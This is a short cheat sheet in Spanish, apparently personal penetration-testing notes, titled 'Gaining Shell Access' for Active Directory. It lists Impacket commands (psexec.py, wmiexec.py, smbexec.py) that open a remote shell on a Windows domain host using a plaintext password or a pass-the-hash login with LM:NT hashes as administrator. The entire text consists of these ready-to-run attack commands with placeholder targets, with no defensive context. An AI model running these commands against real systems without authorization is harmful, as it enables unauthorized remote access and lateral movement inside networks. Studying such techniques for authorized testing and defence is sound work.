# Gaining Shell Access

Tags: #AD #Shell #PsExec #PassTheHash #WmiExec #SmbExec


```bash 
❯ psexec.py Domain/User:'Password'@IP          # Si conocemos la password en texto plano de algun usuario en el dominio la podemos utilizar para ingresar como un usuario valido  

❯ psexec.py Domain/User:@IP                    # Otra manera de ingresar, si la password nos da complicaciones con el comando anterior, aqui solo debemos de colocarla cuando nos la pida

❯ psexec.py administrator@IP -hashes LM:NT     # Podemos utilizar el metodo 'Pass-The-Hash' para ingresar como admin
```

```bash 
Otra herramienta por si no funcion 'PsExec'
❯ wmiexec.py administrator@IP -hashes LM:NT     # Podemos utilizar el metodo 'Pass-The-Hash' para ingresar como admin
```

```bash 
❯ smbexec.py administrator@IP -hashes LM:NT     # Podemos utilizar el metodo 'Pass-The-Hash' para ingresar como admin
```